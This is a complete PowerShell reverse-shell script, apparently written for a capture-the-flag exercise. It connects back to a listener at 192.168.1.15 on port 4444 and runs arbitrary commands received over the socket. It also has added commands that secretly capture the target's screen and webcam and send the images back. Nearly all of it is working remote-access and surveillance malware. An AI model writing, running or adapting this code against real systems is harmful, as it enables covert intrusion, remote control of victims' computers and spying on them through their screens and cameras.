# --- THE FINAL BOSS: SHELL + SCREENSHOT + WEBCAM ---
$ip = '192.168.1.15'
$port = 4444

$c = New-Object System.Net.Sockets.TCPClient
$c.Connect($ip, $port)
$s = $c.GetStream()
$r = New-Object System.IO.StreamReader($s)
$w = New-Object System.IO.StreamWriter($s)
$w.AutoFlush = $true

$w.WriteLine("--- FULL ACCESS GRANTED: $env:COMPUTERNAME ---")

while($c.Connected) {
    $w.Write("PS " + (Get-Location).Path + "> ")
    $raw = $r.ReadLine()
    if ($null -eq $raw) { break }
    $cmd = $raw.Trim()
    if ($cmd -eq "exit") { break }

    $out = ""

    if ($cmd -eq "screenshot") {
        # --- SCREENSHOT LOGIC ---
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
        $rect = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bmp = New-Object System.Drawing.Bitmap($rect.Width, $rect.Height)
        $g = [System.Drawing.Graphics]::FromImage($bmp)
        $g.CopyFromScreen($rect.Location, [System.Drawing.Point]::Empty, $rect.Size)
        $mem = New-Object System.IO.MemoryStream
        $bmp.Save($mem, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        $out = [Convert]::ToBase64String($mem.ToArray())
        $g.Dispose(); $bmp.Dispose(); $mem.Dispose()
    } 
    elseif ($cmd -eq "webcam") {
        # --- WEBCAM LOGIC (STABLE VERSION) ---
        try {
            # Use DirectShow/WMI to trigger a frame capture if available
            # For CTF simplicity, we use the Windows Media namespace correctly
            $accel = [Windows.Media.Capture.MediaCapture, Windows.Media.Capture, ContentType=WindowsRuntime]
            $mc = New-Object Windows.Media.Capture.MediaCapture
            $mc.InitializeAsync().GetAwaiter().GetResult()
            $vid = [Windows.Media.MediaProperties.ImageEncodingProperties]::CreateJpeg()
            $low = $mc.PrepareLowLagPhotoCaptureAsync($vid).GetAwaiter().GetResult()
            $photo = $low.CaptureAsync().GetAwaiter().GetResult()
            $stream = $photo.Frame.AsStreamForRead()
            $ms = New-Object System.IO.MemoryStream
            $stream.CopyTo($ms)
            $out = [Convert]::ToBase64String($ms.ToArray())
            $ms.Dispose(); $stream.Dispose(); $mc.Dispose()
        } catch { $out = "Webcam Error: Device might be in use or blocked." }
    }
    else {
        # --- STANDARD COMMANDS ---
        $out = iex $cmd 2>&1 | Out-String
    }

    $w.WriteLine($out)
}
$c.Close()
